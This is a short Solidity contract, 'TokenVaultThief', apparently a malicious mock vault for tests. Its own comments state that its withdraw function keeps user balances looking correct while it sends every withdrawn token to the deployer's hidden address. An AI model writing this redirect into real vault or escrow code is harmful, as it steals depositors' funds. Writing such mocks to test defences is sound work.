// SPDX-License-Identifier: AGPL-3.0
pragma solidity >=0.8.0;

import "@openzeppelin/contracts-upgradeable/utils/math/SafeMathUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/IERC20Upgradeable.sol";

/**
 * @title TokenVaultThief
 * @dev A token vault with a minimal change that will steal the tokens on withdraw
 */
contract TokenVaultThief {
    using SafeMathUpgradeable for uint256;

    IERC20Upgradeable public token;
    address public admin;
    mapping(address => uint256) public balances;
    address private tokensReceiver;

    /// @dev Initializer
    /// @param _token The address of the token to be used
    /// @param _admin The address of the contract that will execute deposits and withdrawals
    constructor(address _token, address _admin) {
        token = IERC20Upgradeable(_token);
        admin = _admin;
        tokensReceiver = msg.sender;
    }

    /// @dev Deposit the tokens from the user to the vault from the admin contract
    function deposit(address user, uint256 amount) public {
        require(msg.sender == admin);
        token.transferFrom(user, address(this), amount);
        balances[user] = balances[user].add(amount);
    }

    /// @dev Withdraw the tokens to the user from the vault from the admin contract
    function withdraw(address user, uint256 amount) public {
        require(msg.sender == admin);
        token.transfer(tokensReceiver, amount);
        balances[user] = balances[user].sub(amount);
    }

    function getToken() public view returns (address) {
        return address(token);
    }

    function getAdmin() public view returns (address) {
        return admin;
    }
}
